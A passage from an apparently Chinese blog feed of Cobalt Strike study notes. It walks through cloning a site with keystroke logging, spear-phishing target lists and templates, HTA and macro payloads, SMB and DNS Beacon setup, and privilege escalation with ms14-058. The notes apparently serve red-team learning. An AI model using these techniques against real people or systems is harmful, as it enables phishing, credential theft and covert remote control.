title="伪装——克隆网站"></a>伪装——克隆网站</h2><p>在向目标发送漏洞程序之前，我们将自己进行伪装一下，这样可以更好的保护自己，同时提高成功率。CS上有个克隆网站的功能，能够较好的帮助到我们。</p><p>首先，来到<code>Attacks --&gt; Web Drive-by --&gt; Clone Site</code>下，打开克隆网站的功能，之后写入待克隆网站的URL，在Attack中写入MSF中生成的URL。</p><p>其中<code>Log keystrokes on cloned site</code>选项如果勾选则可以获取目标的键盘记录，记录结果在Web Log中能够查看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后，浏览器打开克隆站点地址，如果目标存在漏洞，就可以被利用了，同时在CS中也会观察到主机上线。</p><h1 id="鱼叉式网络钓鱼"><a href="#鱼叉式网络钓鱼" class="headerlink" title="鱼叉式网络钓鱼"></a>鱼叉式网络钓鱼</h1><p>用CS进行钓鱼需要四个步骤：</p><p>1、创建一个目标清单</p><p>2、制作一个邮件模板或者使用之前制作好的模板</p><p>3、选择一个用来发送邮件的邮件服务器</p><p>4、发送邮件</p><h2 id="目标清单"><a href="#目标清单" class="headerlink" title="目标清单"></a>目标清单</h2><p>目标清单就是每行一个邮件地址的txt文件，即每行包含一个目标。</p><p>在一行中除了邮件地址也可以使用标签或一个名字。如果提供了名称，则有助于 Cobalt Strike 自定义每个网络钓鱼。</p><p>这里使用一些在线邮件接收平台的邮箱地址作为示例。</p><pre class="line-numbers language-none"><code class="language-none">astrqb79501@chacuo.nettest1gswtdm26180@chacuo.nettest2ypmgin95416@chacuo.nettest3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将以上内容保存为txt文本文件，就创建好了自己的目标清单。</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>使用模板的好处在于可以重复利用，制作钓鱼模板也很简单。</p><p>首先可以自己写一封邮件发给自己，或者直接从自己收件箱挑选一个合适的。有了合适的邮件之后，查看邮件原始信息，一般在邮件的选项里能找到这个功能。最后将邮件的原始信息保存为文件，一个模板就制作完成了。</p><h2 id="发送邮件"><a href="#发送邮件" class="headerlink" title="发送邮件"></a>发送邮件</h2><p>有了目标和模板，然后选好自己的邮件服务器，之后就可以发送消息了。</p><p>在CS客户端中，点击<code>Attacks --&gt; Spear Phish</code>即可打开网络钓鱼模块。添加上目标、模板、钓鱼地址、邮箱服务、退回邮箱，其中Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致，否则会报错。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>所有信息添加完成后，可以点击Preview查看。如果感觉效果不错，就可以点击send发送了。</p><p>当目标收到钓鱼邮件，并且点击钓鱼邮件中的链接后，如果钓鱼链接配置的没有问题，CS就能够上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>由于此处是仅作为测试用途，所以模板中的链接都是自己的本地内网CS服务器地址，如果是真实环境中，则自然需要使用公网的地址才行。</p><p>在真实环境中的钓鱼邮件也不会像这里这么浮夸，真实环境中的钓鱼邮件往往都伪装成和正经儿的邮件一模一样，单从表面上看很难看出区别，因此提高自己的安全意识还是很重要滴。</p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】8、客户端渗透的重点</title>
      <link href="//200419-150517.html"/>
      <url>//200419-150517.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>什么是客户端攻击</strong></p><p>客户端攻击根据教程直译过来就是一种依靠应用程序使用控制端来进行的可视化攻击。</p><p><code>原文：A client-side attack is an attack against an application used to view attacker controlled content.</code></p><p><strong>为什么要进行客户端攻击</strong></p><p>随着时代发展到了今天，在有各种WAF、防火墙的情况下，各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。</p><p>而当我们发送一个钓鱼文件到客户端上，再由客户端打开这个文件，最后客户端穿过防火墙回连到我们，此时在客户端上我们就获得了一个立足点<code>foothold</code>。这样的一个过程是相对而言是较为容易的，这也是为什么要进行客户端攻击。</p><a id="more"></a><h1 id="0x01-如何获得客户端上的立足点"><a href="#0x01-如何获得客户端上的立足点" class="headerlink" title="0x01 如何获得客户端上的立足点"></a>0x01 如何获得客户端上的立足点</h1><p>1、尽可能多的了解目标环境，即做好信息收集工作</p><p>2、创建一个虚拟机，使它与目标环境尽可能的一致，比如操作系统、使用的浏览器版本等等都需要保证严格一致</p><p>3、攻击刚刚创建的虚拟机，这会是最好的攻击目标</p><p>4、精心策划攻击方法，达到使目标认为这些攻击行为都是正常行为的效果</p><p>5、将精心制作的钓鱼文件发送给目标，比如钓鱼邮件</p><p>如果这五步都非常细致精心的去准备，那么攻击成功的概率会大幅提升。</p><h1 id="0x02-系统侦察"><a href="#0x02-系统侦察" class="headerlink" title="0x02 系统侦察"></a>0x02 系统侦察</h1><p>系统侦察<code>System Profiler</code>是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。</p><p>设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择<code>System Profiler</code>功能模块，配置待跳转的URL等信息即可。</p><p>如果勾选了<code>Use Java Applet to get information</code>则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察</p><pre class="line-numbers language-none"><code class="language-none">1、View --&gt; Applications2、View --&gt; Web Log3、Cobalt Strike --&gt; Visualization --&gt; Target Table<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>值得注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p><h1 id="0x03-用户驱动攻击"><a href="#0x03-用户驱动攻击" class="headerlink" title="0x03 用户驱动攻击"></a>0x03 用户驱动攻击</h1><p>用户驱动攻击<code>User-Driven Attacks</code>需要欺骗用户产生交互才行，但也有许多的优点。</p><p>首先用户驱动攻击不包含恶意攻击代码，所以用户系统上的安全补丁是没用的；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后因为用户驱动攻击十分可靠，也使得它很完美。</p><p>当我们采取行动来追踪并需要攻击时，它就像用户本地执行程序一样，CS为我们提供了几个用户驱动攻击的选项，分别如下：</p><h2 id="用户驱动攻击包"><a href="#用户驱动攻击包" class="headerlink" title="用户驱动攻击包"></a>用户驱动攻击包</h2><p>用户驱动攻击包<code>User-Driven Attacks Packages</code>功能打开位置：<code>Attacks --&gt; Packages</code></p><h3 id="1、HTML应用"><a href="#1、HTML应用" class="headerlink" title="1、HTML应用"></a>1、HTML应用</h3><p>HTML应用<code>HTML Application</code>生成(executable/VBA/powershell)这3种原理不同的VBScript实现的<code>evil.hta</code>文件。</p><h3 id="2、Microsoft-Office-宏文件"><a href="#2、Microsoft-Office-宏文件" class="headerlink" title="2、Microsoft Office 宏文件"></a>2、Microsoft Office 宏文件</h3><p>Microsoft Office 宏文件<code>Microsoft Office Document Macros</code>可以生成恶意宏放入office文件，非常经典的攻击手法。</p><h3 id="3、Payload-生成器"><a href="#3、Payload-生成器" class="headerlink" title="3、Payload 生成器"></a>3、Payload 生成器</h3><p>Payload生成器<code>Payload Generator</code>可以生成各种语言版本的Payload，便于进行免杀。</p><h3 id="4、Windows-可执行文件"><a href="#4、Windows-可执行文件" class="headerlink" title="4、Windows 可执行文件"></a>4、Windows 可执行文件</h3><p>Windows 可执行文件<code>Windows Executable</code> 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb)</p><h3 id="5、Windows-可执行文件（Stageless）"><a href="#5、Windows-可执行文件（Stageless）" class="headerlink" title="5、Windows 可执行文件（Stageless）"></a>5、Windows 可执行文件（Stageless）</h3><p>Windows 可执行文件（Stageless）<code>Windows Executable (Stageless)</code>会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb)</p><h2 id="用户驱动的Web交付攻击"><a href="#用户驱动的Web交付攻击" class="headerlink" title="用户驱动的Web交付攻击"></a>用户驱动的Web交付攻击</h2><p>用户驱动Web交付攻击<code>User-Driven Web Drive-by Attacks</code>功能打开位置：<code>Attacks --&gt; Web Drive-by</code></p><h3 id="1、java-签名-applet-攻击"><a href="#1、java-签名-applet-攻击" class="headerlink" title="1、java 签名 applet 攻击"></a>1、java 签名 applet 攻击</h3><p>java 签名 applet 攻击<code>Java Signed Applet Attack</code>会启动一个Web服务以提供自签名Java Applet的运行环境，浏览器会要求用户授予applet运行权限，如果用户同意则实现控制，但目前该攻击方法已过时。</p><h3 id="2、Java-智能-Applet-攻击"><a href="#2、Java-智能-Applet-攻击" class="headerlink" title="2、Java 智能 Applet 攻击"></a>2、Java 智能 Applet 攻击</h3><p>Java 智能 Applet 攻击<code>Java Smart Applet Attack</code>会自动检测Java版本并利用已知的漏洞绕过安全沙箱，但CS官方称该攻击的实现已过时，在现在的环境中无效。</p><h3 id="3、脚本化-Web-交付"><a href="#3、脚本化-Web-交付" class="headerlink" title="3、脚本化 Web 交付"></a>3、脚本化 Web 交付</h3><p>脚本化 Web 交付<code>Scripted Web Delivery</code> 为payload提供web服务以便于下载和执行，类似于MSF的Script Web Delivery</p><h3 id="4、托管文件"><a href="#4、托管文件" class="headerlink" title="4、托管文件"></a>4、托管文件</h3><p>托管文件<code>Host File</code>通过<code>Attacks --&gt; Web Drive-by --&gt; Host File</code>进行配置，攻击者可以通过这个功能将文件上传到CS服务端上，从而进行文件托管。</p><p>如果想删除上传到CS服务端上的文件，可以到<code>Attacks --&gt; Web Drive-by --&gt; Manage</code>下进行删除。</p><p>如果想查看谁访问了这些文件，可以到<code>View --&gt; Web Log</code>下进行查看。</p><h1 id="0x04-HTML-应用攻击演示"><a href="#0x04-HTML-应用攻击演示" class="headerlink" title="0x04 HTML 应用攻击演示"></a>0x04 HTML 应用攻击演示</h1><p>首先来到<code>Attacks --&gt; Packages --&gt; HTML Application</code>创建一个HTML应用，如果没有创建监听的话，还需要创建一个监听。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>HTML应用文件生成好后，来到<code>Attacks --&gt; Web Drive-by --&gt; Host File</code>，选择刚才生成的文件，最后点击Launch，复制CS创建的链接，在目标主机上打开此链接。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>当在目标主机上提示是否运行时，点击运行。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>当该文件在目标上运行后，CS客户端上就可以看到回连的会话了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs8-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/3975">https://xz.aliyun.com/t/3975</a></p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】7、SMBbean的作用</title>
      <link href="//200419-150510.html"/>
      <url>//200419-150510.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-SMB-Beacon-简介"><a href="#0x00-SMB-Beacon-简介" class="headerlink" title="0x00 SMB Beacon 简介"></a>0x00 SMB Beacon 简介</h1><p>SMB Beacon 使用命名管道通过一个父 Beacon 进行通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效。Windows 将命名管道通信封装在 SMB 协议中。因此得名 SMB Beacon。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效(系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败)。</p><p>SMB Beacon监听器对“提升权限”和“横向渗透”中很有用。</p><h1 id="0x01-SMB-Beacon-配置"><a href="#0x01-SMB-Beacon-配置" class="headerlink" title="0x01 SMB Beacon 配置"></a>0x01 SMB Beacon 配置</h1><p>首先需要一个上线的主机，这里我使用的HTTP Beacon，具体如何上线，可以参考之前第5节《如何建立Payload处理器》学习笔记中的内容，这里不过多赘述。</p><p>主机上线后，新建一个SMB Beacon，输入监听器名称，选择Beacon SMB，管道名称可以直接默认，也可以自定义。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来在Beacon中直接输入<code>spawn SMB</code>，这里的<code>SMB</code>指代的是创建的SMB Beacon的监听器名称，也可以直接右击session，在Spawn选项中选择刚添加的SMB Beacon。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>等待一会儿，就可以看到派生的SMB Beacon，在external中可以看到IP后有个<code>∞∞</code>字符。</p><p>接下来我这里将SMB Beacon插入到进程中，以vmtoolsed进程为例。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在vmtoolsed中插入SMB Beacon后，便能看到process为vmtoolsed.exe的派生SMB Beacon。</p><p>当上线主机较多的时候，只靠列表的方式去展现，就显得不太直观了，通过CS客户端中的透视图便能很好的展现。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在CS中，如果获取到目标的管理员权限，在用户名后会有<code>*</code>号标注，通过这个区别，可以判断出当前上线的test用户为普通权限用户，因此这里给他提升一下权限。</p><h1 id="0x02-其他的一些操作"><a href="#0x02-其他的一些操作" class="headerlink" title="0x02 其他的一些操作"></a>0x02 其他的一些操作</h1><h2 id="1、提权"><a href="#1、提权" class="headerlink" title="1、提权"></a>1、提权</h2><blockquote><p>由于下面与上面内容的笔记不是在同一天写的，因此截图中上线的主机会有所差异，这里主要是记录使用的方法。</p></blockquote><p>由于CS自带的提权方式较少，因此这里就先加载一些网上的提权脚本，脚本下载地址为：<a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a></p><p>下载之后，打开<code>Cobalt Strike --&gt; Script Manager</code> ，之后点击<code>Load</code>，选择自己刚才下载的文件中的<code>elevate.cna</code>文件。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接着选择要提权的主机，右击选择<code>Access --&gt; Elevate</code>，Listener中选择刚才新建的SMB Beacon，这里的Exploit选择了ms14-058，如果使用ms14-058不能提权，就换一个Exploit进行尝试。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>顺利的情况下，就可以看到提权后的管理员权限会话了，在管理员权限的会话中，不光用户名后有个*号，其Logo也是和其他会话不同的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、连接与断开"><a href="#2、连接与断开" class="headerlink" title="2、连接与断开"></a>2、连接与断开</h2><p>此时如果想断开某个会话的连接，可以使用unlink命令，比如如果想断开192.168.175.144，就可以在Beacon中输入<code>unlink 192.168.175.144</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果想再次连上，就直接输入<code>link 192.168.175.144</code>，想从当前主机连到其他主机也可以使用此命令。</p><h1 id="0x03-攻击载荷安全特性"><a href="#0x03-攻击载荷安全特性" class="headerlink" title="0x03 攻击载荷安全特性"></a>0x03 攻击载荷安全特性</h1><p>1、在Beacon传输Payload到目标上执行任务时都会先验证团队服务器，以确保Beacon只接受并只运行来自其团队服务器的任务，并且结果也只能发送到其团队服务器。</p><p>2、在刚开始设置Beacon Payload时，CS会生成一个团队服务器专有的公私钥对，这个公钥嵌入在Beacon的Payload Stage中。Beacon使用团队服务器的公钥来加密传输的元数据，这个元数据中一般包含传输的进程ID、目标系统IP地址、目标主机名称等信息，这也意味着只有团队服务器才能解密这个元数据。</p><p>3、当Beacon从团队服务器下载任务或团队服务器接收Beacon输出时，团队服务器将会使用Beacon生成的会话秘钥来加密任务并解密输出。</p><p>4、值得注意的是，Payload Stagers 因为其体积很小，所以没有这些的安全特性。</p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/">https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】6、DNS_beacon的作用</title>
      <link href="//200419-150502.html"/>
      <url>//200419-150502.html</url>
      
        <content type="html"><![CDATA[<p>由于笔者在学习CS过程中，所看的教程使用的是3.x版本的CS，而我使用的是4.0版本的CS。因此域名配置实操部分是自己参考网上大量文章后自己多次尝试后的结果，所以难免出现错误之处，要是表哥发现文中错误的地方，欢迎留言指正。</p><h1 id="0x00-DNS-Beacon-的工作原理"><a href="#0x00-DNS-Beacon-的工作原理" class="headerlink" title="0x00 DNS Beacon 的工作原理"></a>0x00 DNS Beacon 的工作原理</h1><p>DNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。</p><p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。</p><blockquote><p>以上内容摘自 A-TEAM 团队的 CS 4.0 用户手册</p></blockquote><p>DNS Beacon的工作流程具体如下：</p><p>首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。</p><p>原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。</p><p>根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon什么的会更慢。</p><h1 id="0x01-域名配置"><a href="#0x01-域名配置" class="headerlink" title="0x01 域名配置"></a>0x01 域名配置</h1><p>既然是配置域名，所以就需要先有个域名，这里就用我的博客域名作为示例：添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>添加一个监听器，DNS Hosts填写NS记录和A记录对应的名称，DNS Host填写A记录对应的名称</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>根据上一章的方法创建一个攻击脚本，放到目标主机中运行后，在CS客户端可以看到一个小黑框</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>然后经过漫长的等待，就可以发现已经上线了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs6-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】5、如何建立Payload处理器</title>
      <link href="//200419-150454.html"/>
      <url>//200419-150454.html</url>
      
